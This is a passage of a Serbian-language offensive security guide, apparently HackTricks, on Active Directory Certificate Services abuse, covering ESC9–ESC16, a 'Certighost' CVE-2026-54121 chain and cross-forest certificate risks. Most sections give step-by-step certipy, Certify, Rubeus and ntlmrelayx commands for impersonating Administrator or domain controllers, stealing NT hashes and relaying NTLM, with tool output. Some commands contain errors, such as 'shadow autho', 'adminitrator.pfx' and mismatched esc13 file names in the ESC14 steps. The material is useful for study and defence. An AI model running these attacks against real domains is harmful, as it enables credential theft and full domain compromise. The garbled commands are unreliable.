Nova vrednost **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) za **`msPKI-Enrollment-Flag`**, označena kao ESC9, sprečava ugrađivanje **nove `szOID_NTDS_CA_SECURITY_EXT` security extension** u certificate. Ovaj flag postaje relevantan kada je `StrongCertificateBindingEnforcement` podešen na `1` (podrazumevana vrednost), za razliku od vrednosti `2`. Njegova relevantnost je veća u scenarijima u kojima bi slabije certificate mapping za Kerberos ili Schannel mogao biti iskorišćen (kao kod ESC10), budući da odsustvo ESC9 ne bi promenilo zahteve.

Uslovi pod kojima podešavanje ovog flag-a postaje značajno uključuju:

- `StrongCertificateBindingEnforcement` nije podešen na `2` (podrazumevana vrednost je `1`), ili `CertificateMappingMethods` uključuje `UPN` flag.
- Certificate je označen sa `CT_FLAG_NO_SECURITY_EXTENSION` flag-om u okviru `msPKI-Enrollment-Flag` podešavanja.
- Certificate navodi bilo koji client authentication EKU.
- Dostupne su `GenericWrite` permissions nad bilo kojim account-om radi kompromitovanja drugog account-a.

### Scenario zloupotrebe

Pretpostavimo da `John@corp.local` ima `GenericWrite` permissions nad `Jane@corp.local`, sa ciljem kompromitovanja `Administrator@corp.local`. `ESC9` certificate template, u koji `Jane@corp.local` ima pravo enrolment-a, konfigurisan je sa `CT_FLAG_NO_SECURITY_EXTENSION` flag-om u okviru svog `msPKI-Enrollment-Flag` podešavanja.

Najpre se `Jane`-in hash preuzima pomoću Shadow Credentials, zahvaljujući `John`-ovim `GenericWrite` permissions:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Nakon toga, `userPrincipalName` korisnika `Jane` se menja u `Administrator`, namerno izostavljajući domenski deo `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Ova izmena ne krši ograničenja, imajući u vidu da `Administrator@corp.local` ostaje različit kao `userPrincipalName` korisnika `Administrator`.

Nakon toga, certifikatni predložak `ESC9`, označen kao ranjiv, zahteva se kao `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Primećeno je da `userPrincipalName` sertifikata odražava `Administrator`, bez ikakvog „object SID“.

`userPrincipalName` korisnika `Jane` zatim se vraća na prvobitnu vrednost, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Pokušaj autentifikacije pomoću izdatog sertifikata sada daje NT hash korisnika `Administrator@corp.local`. Komanda mora da sadrži `-domain <domain>` zbog toga što sertifikat ne navodi domen:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Slaba mapiranja sertifikata - ESC10

### Objašnjenje

Dve vrednosti ključeva registra na kontroleru domena označavaju se kao ESC10:

- Podrazumevana vrednost za `CertificateMappingMethods` u `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` iznosi `0x18` (`0x8 | 0x10`), dok je ranije bila postavljena na `0x1F`.
- Podrazumevana postavka za `StrongCertificateBindingEnforcement` u `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` iznosi `1`, dok je ranije bila `0`.

**Slučaj 1**

Kada je `StrongCertificateBindingEnforcement` konfigurisan na `0`.

**Slučaj 2**

Ako `CertificateMappingMethods` uključuje `UPN` bit (`0x4`).

### Abuse Case 1

Kada je `StrongCertificateBindingEnforcement` konfigurisan na `0`, nalog A sa `GenericWrite` dozvolama može se iskoristiti za kompromitovanje bilo kog naloga B.

Na primer, ako napadač ima `GenericWrite` dozvole nad `Jane@corp.local`, cilj mu je da kompromituje `Administrator@corp.local`. Procedura je ista kao kod ESC9, što omogućava korišćenje bilo kog certificate template-a.

Najpre se hash naloga `Jane` preuzima pomoću Shadow Credentials, iskorišćavanjem `GenericWrite` dozvole.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Nakon toga, `userPrincipalName` korisnice `Jane` menja se u `Administrator`, namerno izostavljajući deo `@corp.local` kako bi se izbeglo kršenje ograničenja.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Nakon toga se zahteva sertifikat koji omogućava autentifikaciju klijenta kao `Jane`, koristeći podrazumevani `User` šablon.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` korisnice `Jane` se zatim vraća na prvobitnu vrednost, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Autentifikacija pomoću dobijenog sertifikata vratiće NT hash za `Administrator@corp.local`, zbog čega je neophodno navesti domen u komandi, jer sertifikat ne sadrži podatke o domenu.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Slučaj zloupotrebe 2

Kada `CertificateMappingMethods` sadrži bit zastavicu `UPN` (`0x4`), nalog A sa dozvolama `GenericWrite` može da kompromituje bilo koji nalog B kojem nedostaje svojstvo `userPrincipalName`, uključujući mašinske naloge i ugrađeni administrator domena `Administrator`.

Ovde je cilj kompromitovati `DC$@corp.local`, počevši od pribavljanja hash-a naloga `Jane` pomoću Shadow Credentials, uz iskorišćavanje dozvole `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`userPrincipalName` korisnika `Jane` se zatim postavlja na `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Sertifikat za autentifikaciju klijenta zahteva se kao `Jane` koristeći podrazumevani `User` template.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Vrednost `userPrincipalName` korisnika `Jane` se nakon ovog procesa vraća na prvobitnu vrednost.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Za autentifikaciju putem Schannel-a koristi se Certipy opcija `-ldap-shell`, što ukazuje na uspešnu autentifikaciju kao `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Kroz LDAP shell, komande kao što je `set_rbcd` omogućavaju Resource-Based Constrained Delegation (RBCD) napade, koji potencijalno mogu kompromitovati kontroler domena.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Ova ranjivost se takođe odnosi na svaki korisnički nalog kojem nedostaje `userPrincipalName` ili kod kojeg se on ne podudara sa `sAMAccountName`, pri čemu je podrazumevani nalog `Administrator@corp.local` glavna meta zbog svojih povišenih LDAP privilegija i činjenice da podrazumevano nema `userPrincipalName`.

## Relaying NTLM to ICPR - ESC11

### Objašnjenje

Ako CA Server nije konfigurisan sa `IF_ENFORCEENCRYPTICERTREQUEST`, moguće je izvoditi NTLM relay attacks bez potpisivanja putem RPC servisa. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

Možete koristiti `certipy` za enumeraciju i proveru da li je `Enforce Encryption for Requests` onemogućen; certipy će prikazati `ESC11` Vulnerabilities.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Scenario zloupotrebe

Potrebno je podesiti relay server:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Napomena: Za kontrolere domena, moramo navesti `-template` u DomainController.

Ili koristeći [sploutchy's fork of impacket](https://github.com/sploutchy/impacket):
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access do ADCS CA sa YubiHSM - ESC12

### Objašnjenje

Administratori mogu podesiti Certificate Authority tako da se čuva na eksternom uređaju kao što je "Yubico YubiHSM2".

Ako je USB uređaj povezan sa CA serverom preko USB porta, ili preko USB device servera u slučaju da je CA server virtuelna mašina, za Key Storage Provider je potreban authentication key (ponekad se naziva i "password") kako bi generisao i koristio ključeve u YubiHSM-u.

Ovaj key/password se čuva u registru na lokaciji `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` u čistom tekstu.

Reference se nalazi [ovde](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Scenario zloupotrebe

Ako je privatni ključ CA-a sačuvan na fizičkom USB uređaju, moguće je preuzeti ključ kada dobijete shell access.

Najpre je potrebno pribaviti CA certificate (javan je), a zatim:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Na kraju, koristite komandu `certutil -sign` da biste izradili novi proizvoljni sertifikat koristeći CA sertifikat i njegov privatni ključ.

## OID Group Link Abuse - ESC13

### Objašnjenje

Atribut `msPKI-Certificate-Policy` omogućava dodavanje politike izdavanja u template sertifikata. Objekti `msPKI-Enterprise-Oid`, odgovorni za izdavanje politika, mogu se pronaći u Configuration Naming Context-u (CN=OID,CN=Public Key Services,CN=Services) PKI OID kontejnera. Politika se može povezati sa AD grupom pomoću atributa `msDS-OIDToGroupLink` ovog objekta, čime se sistemu omogućava da autorizuje korisnika koji priloži sertifikat kao da je član te grupe. [Referenca se nalazi ovde](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

Drugim rečima, kada korisnik ima dozvolu za enroll sertifikata i sertifikat je povezan sa OID grupom, korisnik može naslediti privilegije te grupe.

Koristite [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) da pronađete OIDToGroupLink:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Scenario zloupotrebe

Pronađite dozvolu korisnika pomoću `certipy find` ili `Certify.exe find /showAllPermissions`.

Ako `John` ima dozvolu za enroll u `VulnerableTemplate`, korisnik može da nasledi privilegije grupe `VulnerableGroup`.

Sve što treba da uradi jeste da navede template; dobiće sertifikat sa pravima `OIDToGroupLink`.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Vulnerable Certificate Renewal Configuration- ESC14

### Objašnjenje

Opis na https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping je izuzetno detaljan. U nastavku je citat originalnog teksta.

ESC14 se bavi ranjivostima koje nastaju zbog „weak explicit certificate mapping“, prvenstveno usled zloupotrebe ili nesigurne konfiguracije atributa `altSecurityIdentities` na Active Directory korisničkim ili računarskim nalozima. Ovaj atribut sa više vrednosti omogućava administratorima da ručno povežu X.509 certificates sa AD nalogom u svrhu authentication. Kada je popunjen, ova eksplicitna mapiranja mogu nadjačati podrazumevanu logiku mapiranja certificates, koja se obično oslanja na UPN-ove ili DNS names u SAN-u certificate-a, ili na SID ugrađen u `szOID_NTDS_CA_SECURITY_EXT` security extension.

„Slabo“ mapiranje nastaje kada je vrednost string-a korišćena unutar atributa `altSecurityIdentities` za identifikaciju certificate-a previše široka, lako pogodiva, oslanja se na nejedinstvena polja certificate-a ili koristi komponente certificate-a koje se lako mogu spoof-ovati. Ako attacker može da pribavi ili izradi certificate čiji attributes odgovaraju tako slabo definisanom eksplicitnom mapiranju privilegovanog naloga, taj certificate može koristiti za authentication kao taj nalog i njegovu impersonation.

Primeri potencijalno slabih `altSecurityIdentities` mapping string-ova uključuju:

- Mapiranje isključivo prema uobičajenom Subject Common Name (CN): npr. `X509:<S>CN=SomeUser`. Attacker bi mogao da dobije certificate sa ovim CN-om iz manje sigurnog izvora.
- Korišćenje previše opštih Issuer Distinguished Name (DN) ili Subject DN vrednosti bez dodatne kvalifikacije, kao što su određeni serial number ili subject key identifier: npr. `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Korišćenje drugih predvidljivih obrazaca ili nekriptografskih identifikatora koje attacker može da ispuni u certificate-u koji može legitimno da dobije ili forge-uje (ako je kompromitovao CA ili pronašao ranjiv template kao u ESC1).

Atribut `altSecurityIdentities` podržava različite formate za mapiranje, kao što su:

- `X509:<I>IssuerDN<S>SubjectDN` (mapira prema punim Issuer i Subject DN vrednostima)
- `X509:<SKI>SubjectKeyIdentifier` (mapira prema vrednosti Subject Key Identifier extension-a certificate-a)
- `X509:<SR>SerialNumberBackedByIssuerDN` (mapira prema serial number-u, implicitno kvalifikovanom Issuer DN-om) - ovo nije standardni format; obično je `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (mapira prema RFC822 name-u, obično email address-u, iz SAN-a)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (mapira prema SHA1 hash-u sirovog public key-a certificate-a - generalno jako mapiranje)

Bezbednost ovih mapiranja u velikoj meri zavisi od specifičnosti, jedinstvenosti i kriptografske snage izabranih identifikatora certificate-a korišćenih u mapping string-u. Čak i kada su na Domain Controllers omogućeni jaki režimi certificate binding-a (koji prvenstveno utiču na implicitna mapiranja zasnovana na SAN UPN-ovima/DNS-ovima i SID extension-u), loše konfigurisan unos u `altSecurityIdentities` i dalje može predstavljati direktan put za impersonation ako je sama logika mapiranja pogrešna ili previše permisivna.

### Scenario zloupotrebe

ESC14 cilja **eksplicitna mapiranja certificates** u Active Directory-ju (AD), konkretno atribut `altSecurityIdentities`. Ako je ovaj atribut podešen (namerno ili usled pogrešne konfiguracije), attacker može da impersonate-uje naloge tako što će prezentovati certificates koji odgovaraju mapiranju.

#### Scenario A: Attacker može da upisuje u `altSecurityIdentities`

**Precondition**: Attacker ima write permissions nad atributom `altSecurityIdentities` ciljnog naloga ili permission da mu dodeli tu mogućnost u obliku jedne od sledećih permissions na ciljnom AD object-u:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.

#### Scenario B: Cilj ima slabo mapiranje putem X509RFC822 (Email)

- **Precondition**: Cilj ima slabo X509RFC822 mapiranje u altSecurityIdentities. Attacker može da podesi mail atribut victim-a tako da odgovara X509RFC822 name-u cilja, da enroll-uje certificate kao victim i da ga koristi za authentication kao cilj.

#### Scenario C: Cilj ima X509IssuerSubject mapiranje

- **Precondition**: Cilj ima slabo X509IssuerSubject eksplicitno mapiranje u `altSecurityIdentities`.Attacker može da podesi atribut `cn` ili `dNSHostName` na victim principal-u tako da odgovara subject-u X509IssuerSubject mapiranja cilja. Zatim attacker može da enroll-uje certificate kao victim i da koristi ovaj certificate za authentication kao cilj.

#### Scenario D: Cilj ima X509SubjectOnly mapiranje

- **Precondition**: Cilj ima slabo X509SubjectOnly eksplicitno mapiranje u `altSecurityIdentities`. Attacker može da podesi atribut `cn` ili `dNSHostName` na victim principal-u tako da odgovara subject-u X509SubjectOnly mapiranja cilja. Zatim attacker može da enroll-uje certificate kao victim i da koristi ovaj certificate za authentication kao cilj.

### konkretne operacije
#### Scenario A

Zatražite certificate certificate template-a `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Sačuvajte i konvertujte sertifikat
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Autentifikujte se (koristeći sertifikat)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Čišćenje (opciono)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
Za specifičnije metode napada u različitim scenarijima napada pogledajte sledeće: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Objašnjenje

Opis na adresi https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc je izuzetno detaljan. U nastavku je navod iz originalnog teksta.

Korišćenjem podrazumevanih ugrađenih certificate templates verzije 1, napadač može da napravi CSR koji uključuje application policies sa prednošću u odnosu na konfigurisane Extended Key Usage atribute navedene u template-u. Jedini uslov su prava za enrollment, a ovo se može koristiti za generisanje client authentication, certificate request agent i codesigning certificates pomoću **_WebServer_** template-a.

### Abuse

Sledeće je navedeno na [ovom linku]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu),Kliknite da biste videli detaljnije metode upotrebe.


Certipy-jeva `find` komanda može pomoći u identifikovanju V1 template-a koji su potencijalno podložni ESC15 ako CA nije zakrpljen.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Scenario A: Direktno impersoniranje putem Schannel-a

**Korak 1: Zatražite sertifikat, ubacujući „Client Authentication“ Application Policy i ciljni UPN.** Napadač `attacker@corp.local` cilja `administrator@corp.local` koristeći V1 template „WebServer“ (koji omogućava subject koji navodi enrollee).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: Ranjivi V1 template sa opcijom „Enrollee supplies subject“.
- `-application-policies 'Client Authentication'`: Ubacuje OID `1.3.6.1.5.5.7.3.2` u ekstenziju Application Policies CSR-a.
- `-upn 'administrator@corp.local'`: Postavlja UPN u SAN za impersonation.

**Korak 2: Autentikujte se putem Schannel-a (LDAPS) koristeći dobijeni sertifikat.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Scenario B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

**Step 1: Request a certificate from a V1 template (with "Enrollee supplies subject"), injecting "Certificate Request Agent" Application Policy.** Ovaj sertifikat je namenjen napadaču (`attacker@corp.local`) kako bi postao enrollment agent. UPN za identitet samog napadača ovde nije naveden, jer je cilj dobijanje mogućnosti agenta.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Injects OID `1.3.6.1.4.1.311.20.2.1`.

**Korak 2: Koristite "agent" sertifikat da zatražite sertifikat u ime ciljnog privilegovanog korisnika.** Ovo je korak sličan ESC3, koji koristi sertifikat iz Koraka 1 kao agent sertifikat.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Korak 3: Autentifikujte se kao privilegovani korisnik koristeći sertifikat „on-behalf-of“.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Security Extension Disabled on CA (Globally)-ESC16

### Objašnjenje

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** odnosi se na scenario u kojem, ako konfiguracija AD CS ne zahteva uključivanje ekstenzije **szOID_NTDS_CA_SECURITY_EXT** u sve certificate-e, attacker može da je iskoristi na sledeći način:

1. Zahtevanjem certificate-a **without SID binding**.

2. Korišćenjem ovog certificate-a **for authentication as any account**, na primer za impersonating naloga sa visokim privilegijama (npr. Domain Administrator).

Takođe možete pogledati ovaj članak da biste saznali više o detaljnom principu:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### Abuse

Sledeće je preuzeto sa [ovog linka](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally),Kliknite da biste videli detaljnije metode upotrebe.

Da biste utvrdili da li je okruženje Active Directory Certificate Services (AD CS) ranjivo na **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Korak 1: Pročitajte početni UPN naloga žrtve (opciono - za vraćanje u prethodno stanje).**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Korak 2: Ažurirajte UPN naloga žrtve na `sAMAccountName` ciljnog administratora.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Korak 3: (Ako je potrebno) Nabavite kredencijale za nalog „žrtve“ (npr. putem Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Korak 4: Zatražite sertifikat kao korisnik „žrtva“ iz _bilo kog odgovarajućeg template-a za client authentication_ (npr. „User“) na CA-u ranjivom na ESC16.** Pošto je CA ranjiv na ESC16, automatski će izostaviti SID security extension iz izdatog sertifikata, bez obzira na konkretna podešavanja ovog extension-a u template-u. Podesite promenljivu okruženja za Kerberos credential cache (shell command):
```bash
export KRB5CCNAME=victim.ccache
```
Zatim zatražite sertifikat:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Korak 5: Vratite UPN naloga "victim".**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Korak 6: Autentifikujte se kao ciljani administrator.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Rogue LDAP/LSA chase callback identity substitution (Certighost / CVE-2026-54121)

### Objašnjenje

**Certighost** zloupotrebljava **AD CS enrollment chase / callback path** u kojem CA veruje atributima zahteva koje je dostavio podnosilac i koristi ih za određivanje identiteta koji treba da bude upisan u izdatom sertifikatu. U javnom PoC-u, kreirani zahtev sadrži:

- **`cdc`**: host/IP adresu pod kontrolom napadača koju će CA kontaktirati
- **`rmd`**: **DNS ime ciljnog Domain Controller-a** za impersonaciju

Ako CA prati taj chase, povezaće se sa napadačem preko **SMB/LSA (`445`)** i **LDAP-a (`389`)**. Napadač koristi **stvarni machine account** (obično kreiran zahvaljujući podrazumevanom **`ms-DS-MachineAccountQuota`**) tako da se callback sesija autentifikuje kao validan principal domena, ali rogue servisi umesto toga vraćaju atribute identiteta **ciljnog DC-a**:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

Ako CA **kriptografski ne poveže vraćeni identitet sa autentifikovanim callback principalom**, može izdati sertifikat za **Domain Controller**, iako se sesija autentifikovala pomoću machine account-a pod kontrolom napadača. Zbog toga se ova greška konceptualno razlikuje od greške **Certifried**: umesto izmene AD atributa kao što je `dNSHostName`, napadač **zamenjuje podatke identiteta tokom CA callback rezolucije**.

**Korisni preduslovi:**

- Nisko-privilegovani **domain credentials**
- Mogućnost **kreiranja ili ponovne upotrebe computer account-a**
- Mrežna dostupnost od **CA** do portova pod kontrolom napadača, **`389`** i **`445`**
- Ranljiva / nezakrpljena CA putanja za obradu zahteva (Microsoft update od **14. jula 2026.** dodao je **DC validation za `cdc`** i **poređenje razrešenog SID-a**)

Dobijeni **`.pfx`** se zatim može koristiti za **PKINIT**, čime se dobija **`.ccache`** i, prema objavljenom PoC toku, **NT hash ciljnog DC-a**, što je obično dovoljno za **potpunu kompromitaciju domena**.

### Zloupotreba

Javni PoC automatizuje čitav lanac:

1. Kreiranje ili ponovna upotreba **machine account-a** pod kontrolom napadača.
2. Pokretanje **rogue LDAP i SMB/LSA listenera** na portovima `389` i `445`.
3. Slanje zahteva za sertifikat koji sadrži atribute **`cdc`** pod kontrolom napadača i ciljni **`rmd`**.
4. Omogućavanje CA-u da se autentifikuje na rogue listenerima kao kontrolisani machine account, uz vraćanje atributa **ciljnog DC-a** kao odgovora na upite identiteta.
5. Primanje CA-potpisanog **DC sertifikata**, a zatim njegovo korišćenje za **PKINIT**.
```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```
Korisne runtime zastavice iz PoC-a:

- `--listener <ip>`: eksplicitno bira callback IP koji se oglašava u `cdc`
- `--computer-name <NAME$>`: ponovo koristi postojeći machine account umesto kreiranja novog

**Operativne napomene:**

- PoC zahteva **root** jer se vezuje za **privilegovane portove** `389` i `445`.
- Uspešna eksploatacija lokalno upisuje **DC `.pfx`** i **Kerberos `.ccache`**.
- Pošto se sertifikat mapira na **Domain Controller account**, naknadne aktivnosti mogu da obuhvate **certificate-based Kerberos auth**, **DCSync** i ponovno korišćenje oporavljenog **machine NT hash-a**.

## Objašnjenje kompromitovanja šuma pomoću sertifikata u pasivu

### Narušavanje poverenja između šuma kompromitovanim CA-ovima

Konfiguracija za **cross-forest enrollment** može se relativno jednostavno sprovesti. **Root CA certificate** iz resource forest-a administratori **objavljuju u account forest-ovima**, a **enterprise CA** sertifikati iz resource forest-a **dodaju se u `NTAuthCertificates` i AIA kontejnere u svakom account forest-u**. Preciznije, ovakvim rasporedom se **CA-u u resource forest-u dodeljuje potpuna kontrola** nad svim ostalim šumama za koje upravlja PKI-jem. Ukoliko bi ovaj CA bio **kompromitovan od strane napadača**, oni bi mogli da **krivotvore sertifikate za sve korisnike u resource i account forest-ovima**, čime bi se narušila bezbednosna granica šume.

### Privilegije za enrollment dodeljene stranim principalima

U multi-forest okruženjima potrebno je obratiti pažnju na Enterprise CA-ove koji **objavljuju certificate templates** koji **Authenticated Users ili foreign principalima** (korisnicima/grupama izvan šume kojoj Enterprise CA pripada) omogućavaju **prava za enrollment i izmenu**.\
Prilikom autentifikacije preko trust-a, AD dodaje **Authenticated Users SID** u korisnikov token. Zato, ako domen poseduje Enterprise CA sa template-om koji **Authenticated Users-ima dozvoljava enrollment rights**, korisnik iz druge šume bi potencijalno mogao da izvrši **enrollment nad template-om**. Isto tako, ako se **enrollment rights eksplicitno dodele foreign principalu putem template-a**, time se kreira **cross-forest access-control relationship**, koja principalu iz jedne šume omogućava da **izvrši enrollment nad template-om iz druge šume**.

Oba scenarija dovode do **povećanja attack surface-a** iz jedne šume prema drugoj. Napadač bi mogao da iskoristi podešavanja certificate template-a za dobijanje dodatnih privilegija u stranom domenu.


## Reference

- [aniqfakhrul/CVE-2026-54121 PoC repository](https://github.com/aniqfakhrul/CVE-2026-54121)
- [H0j3n - Certighost technical analysis](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../../banners/hacktricks-training.md}}
